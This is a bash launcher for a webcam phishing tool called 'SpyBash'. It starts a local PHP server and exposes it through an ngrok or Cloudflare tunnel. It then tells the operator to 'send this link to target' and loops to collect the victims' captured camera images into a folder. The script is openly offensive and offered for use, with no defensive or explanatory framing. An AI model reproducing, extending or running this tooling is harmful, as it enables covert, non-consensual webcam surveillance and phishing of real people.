#!/bin/bash

clear
chmod +x ngrok cloudflared

# Banner
echo -e "\e[92m"
cat << "EOF"
███████╗██████╗ ██╗   ██╗██████╗  █████╗ ███████╗██╗  ██╗
██╔════╝██╔══██╗██║   ██║██╔══██╗██╔══██╗██╔════╝╚██╗██╔╝
█████╗  ██████╔╝██║   ██║██████╔╝███████║█████╗   ╚███╔╝ 
██╔══╝  ██╔═══╝ ██║   ██║██╔═══╝ ██╔══██║██╔══╝   ██╔██╗ 
███████╗██║     ╚██████╔╝██║     ██║  ██║███████╗██╔╝ ██╗
╚══════╝╚═╝      ╚═════╝ ╚═╝     ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
          [ 🔥 Cam Phishing Tool - SpyBash 🔥 ]
EOF
echo -e "\e[0m"

# Start local server
php -S 127.0.0.1:8080 > /dev/null 2>&1 &
sleep 2

# Choose tunnel method
echo "[1] Ngrok"
echo "[2] Cloudflare Tunnel"
read -p "Choose tunnel [1/2]: " option

if [[ $option == "1" ]]; then
    echo "[*] Starting ngrok..."
    ./ngrok http 8080 > /dev/null 2>&1 &
    sleep 7
    link=$(curl -s http://127.0.0.1:4040/api/tunnels | grep -o 'https://[0-9a-zA-Z.]*\.ngrok.io')
elif [[ $option == "2" ]]; then
    echo "[*] Starting Cloudflare Tunnel..."
    ./cloudflared tunnel --url http://localhost:8080 | tee .clfl.log &
    sleep 8
    link=$(grep -o 'https://[-a-zA-Z0-9.]*trycloudflare.com' .clfl.log | head -n 1)
else
    echo "[!] Invalid option."
    exit 1
fi

echo -e "\n[+] Send this link to target: \e[92m$link\e[0m"
echo "[*] Waiting for cam access and uploads..."

# Move received images to 'captured/' folder
while true; do
  if [ "$(ls *.png 2>/dev/null)" ]; then
    for img in *.png; do
      echo -e "[📸] Cam file received: $img"
      mv "$img" captured/
    done
  fi
  sleep 2
done